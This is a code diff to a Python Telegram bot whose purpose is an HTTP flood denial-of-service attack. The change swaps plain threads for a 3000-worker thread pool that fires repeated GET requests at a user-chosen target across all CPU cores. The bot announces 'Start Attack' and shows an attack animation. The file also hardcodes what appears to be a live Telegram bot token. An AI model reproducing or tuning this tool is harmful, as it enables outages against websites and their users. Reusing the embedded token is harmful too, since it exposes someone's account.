@@ -1,10 +1,9 @@
-
 import telebot
-import threading
 import time
 import multiprocessing
 import requests
 from colorama import Fore, Style
+from concurrent.futures import ThreadPoolExecutor
 
 # ضع رمز التوكن الخاص بك هنا
 TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'
@@ -32,24 +31,23 @@ def check_password(message):
         bot.send_message(message.chat.id, Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)
 
 def send_requests_threaded(target, request_count, stop_flag):
-    def send_request_thread():
-        for _ in range(int(request_count)):
+    session = requests.Session()
+    
+    def send_request():
+        try:
+            if not stop_flag.value:
+                response = session.get(target, timeout=5)
+        except requests.exceptions.RequestException:
+            pass
+
+    num_threads = 3000  # استخدام 3000 خيط كحد أقصى
+
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = [executor.submit(send_request) for _ in range(int(request_count))]
+        
+        for future in futures:
             if stop_flag.value:
                 break
-            try:
-                response = requests.get(target, timeout=5)
-            except requests.exceptions.RequestException:
-                pass
-
-    threads = []
-    num_threads = 1000  # زيادة عدد الخيوط بشكل كبير
-    for _ in range(num_threads):
-        thread = threading.Thread(target=send_request_thread)
-        threads.append(thread)
-        thread.start()
-
-    for thread in threads:
-        thread.join()
 
 def show_attack_animation(chat_id):
     bot.send_message(chat_id, "Loading...")
@@ -71,7 +69,7 @@ def execute_attack(message, target, request_count):
     attack_duration = int(message.text)
     total_cores = multiprocessing.cpu_count()
 
-    bot.send_message(message.chat.id, f"Sending {request_count} requests to {target} using {total_cores} cores and 5000 threads per process...")
+    bot.send_message(message.chat.id, f"Sending {request_count} requests to {target} using {total_cores} cores and 100 threads per process...")
 
     show_attack_animation(message.chat.id)
     bot.send_message(message.chat.id, "Start Attack")
